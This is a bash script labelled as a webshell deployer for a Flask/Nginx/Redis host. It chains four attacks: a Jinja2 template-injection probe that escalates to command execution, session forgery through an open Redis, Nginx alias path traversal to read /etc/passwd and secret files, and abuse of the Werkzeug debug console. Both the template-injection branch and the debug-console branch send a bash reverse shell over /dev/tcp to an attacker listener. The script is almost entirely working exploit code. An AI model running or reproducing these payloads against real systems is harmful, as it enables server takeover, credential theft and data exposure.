#!/bin/bash
# deploy_nginx_flask_shell.sh — Webshell deployer for Flask/Nginx app
# Target: svc-redis-01 (Redis 7.0.15 / Flask 3.1.3 / Nginx 1.24.0)
# Techniques:
#   1. SSTI (Server-Side Template Injection) probe for Jinja2
#   2. Redis session forgery → admin access → file upload
#   3. Nginx off-by-slash path traversal probe
#   4. Flask debug PIN cracking (if debug mode is on)
# Usage: ./deploy_nginx_flask_shell.sh <target_ip> [web_port] [redis_port]

TARGET="${1:?Usage: $0 <target_ip> [web_port] [redis_port]}"
WEB_PORT="${2:-80}"
REDIS_PORT="${3:-6379}"
LHOST="${4:-$(hostname -I | awk '{print $1}')}"
LPORT="${5:-4447}"

BASE_URL="http://${TARGET}:${WEB_PORT}"

echo "[*] === Flask/Nginx/Redis Webshell Deployer ==="
echo "[*] Target : $BASE_URL"
echo ""

# ── Probe app routes ─────────────────────────────────────────────────────────
echo "[*] Probing app routes..."
for ROUTE in / /login /admin /api /upload /search /debug /console /api/v1/; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}${ROUTE}" --max-time 5)
    [[ "$CODE" =~ ^(200|301|302|403)$ ]] && echo "    $CODE -> ${BASE_URL}${ROUTE}"
done

# ── Method 1: SSTI Probe ──────────────────────────────────────────────────────
echo ""
echo "[*] [1] Probing for Jinja2 SSTI..."
SSTI_PAYLOADS=(
    "{{7*7}}"
    "{{7*'7'}}"
    "${{7*7}}"
    "<%=7*7%>"
)
SSTI_PARAMS=("q" "name" "search" "input" "msg" "message" "query" "template" "page")

# url-encode helper: pipes via stdin to avoid all quoting issues with special chars
urlencode() { printf '%s' "$1" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()),end='')"; }

for PARAM in "${SSTI_PARAMS[@]}"; do
    for PAYLOAD in "${SSTI_PAYLOADS[@]}"; do
        ENC=$(urlencode "$PAYLOAD")
        for ROUTE in / /search /login; do
            RESP=$(curl -s "${BASE_URL}${ROUTE}?${PARAM}=${ENC}" --max-time 5 2>/dev/null)
            if echo "$RESP" | grep -qE "^49$|>49<"; then
                echo "[+] SSTI found: ${BASE_URL}${ROUTE}?${PARAM}=${PAYLOAD}"
                # Escalate to RCE
                RCE_PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
                RCE_ENC=$(urlencode "$RCE_PAYLOAD")
                RCE_RESP=$(curl -s "${BASE_URL}${ROUTE}?${PARAM}=${RCE_ENC}" --max-time 5)
                if echo "$RCE_RESP" | grep -qE "uid=[0-9]+"; then
                    echo "[+] SSTI RCE confirmed!"
                    echo "    Payload: ${RCE_PAYLOAD}"
                    # Drop reverse shell
                    RS_PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("bash -c '"'"'bash -i >& /dev/tcp/'"${LHOST}"'/'"${LPORT}"' 0>&1'"'"'").read()}}'
                    RS_ENC=$(urlencode "$RS_PAYLOAD")
                    echo "[*] Firing reverse shell to ${LHOST}:${LPORT}..."
                    echo "[!] Start: nc -lvnp ${LPORT}"
                    curl -s "${BASE_URL}${ROUTE}?${PARAM}=${RS_ENC}" --max-time 10 > /dev/null &
                fi
                break 3
            fi
        done
    done
done

# ── Method 2: Redis session forgery ──────────────────────────────────────────
echo ""
echo "[*] [2] Attempting Redis session forgery..."
# Flask often stores sessions in Redis — if we control Redis, we can forge admin sessions
SESSION_KEY=$(redis-cli -h "$TARGET" -p "$REDIS_PORT" --no-auth-warning \
    KEYS "session:*" 2>/dev/null | head -5)
if [[ -n "$SESSION_KEY" ]]; then
    echo "[+] Found session keys in Redis:"
    echo "$SESSION_KEY" | while read -r KEY; do
        echo "    $KEY : $(redis-cli -h "$TARGET" -p "$REDIS_PORT" GET "$KEY" 2>/dev/null)"
    done

    # Try to find/forge an admin session
    ADMIN_SESSION='{"user_id": 1, "username": "admin", "is_admin": true, "logged_in": true}'
    FORGED_KEY="session:forged_admin_$(date +%s)"
    redis-cli -h "$TARGET" -p "$REDIS_PORT" SET "$FORGED_KEY" "$ADMIN_SESSION" EX 86400 2>/dev/null \
        && echo "[+] Forged session key: $FORGED_KEY" \
        && echo "    Use cookie: session=$FORGED_KEY"
else
    echo "[-] No session keys found in Redis (may require auth)"
fi

# ── Method 3: Nginx off-by-slash traversal ────────────────────────────────────
echo ""
echo "[*] [3] Probing Nginx alias path traversal..."
# Nginx alias off-by-slash: /static../  or /files../
for PREFIX in /static /files /media /assets /uploads /img; do
    RESP=$(curl -s "${BASE_URL}${PREFIX}../" --max-time 5 -w "\n%{http_code}")
    CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -1)
    if [[ "$CODE" == "200" ]] && echo "$BODY" | grep -q "index\|<html\|passwd"; then
        echo "[+] Nginx alias traversal at: ${BASE_URL}${PREFIX}../"
        # Try to read sensitive files
        for FILE in "../../etc/passwd" "../../app/app.py" "../../app/config.py" "../../.env"; do
            FENC=$(urlencode "$FILE")
            FCONTENT=$(curl -s "${BASE_URL}${PREFIX}../${FENC}" --max-time 5)
            if echo "$FCONTENT" | grep -q "root:\|SECRET\|password\|DATABASE"; then
                echo "[+]   Readable: ${FILE}"
                echo "$FCONTENT" | head -20
            fi
        done
    fi
done

# ── Method 4: Flask debug console ─────────────────────────────────────────────
echo ""
echo "[*] [4] Probing for Flask Werkzeug debug console..."
DEBUG_RESP=$(curl -s "${BASE_URL}/console" --max-time 5)
if echo "$DEBUG_RESP" | grep -qi "werkzeug\|interactive console\|__debugger__"; then
    echo "[+] Flask debug console accessible at ${BASE_URL}/console"
    echo "[!] If PIN is needed, retrieve with: python3 ../exploit/flask_pin_crack.py $TARGET $WEB_PORT"
    echo "    Once in console, execute: import os; os.system('bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &')"
else
    echo "[-] No debug console (expected in production)"
fi

echo ""
echo "[*] === Summary ==="
echo "    SSTI   : check params q/name/search/input on various routes"
echo "    Session: forged Redis session key if Redis is open"
echo "    Nginx  : alias traversal probed above"
echo "    Debug  : ${BASE_URL}/console"
echo "    LHOST:LPORT = ${LHOST}:${LPORT}"
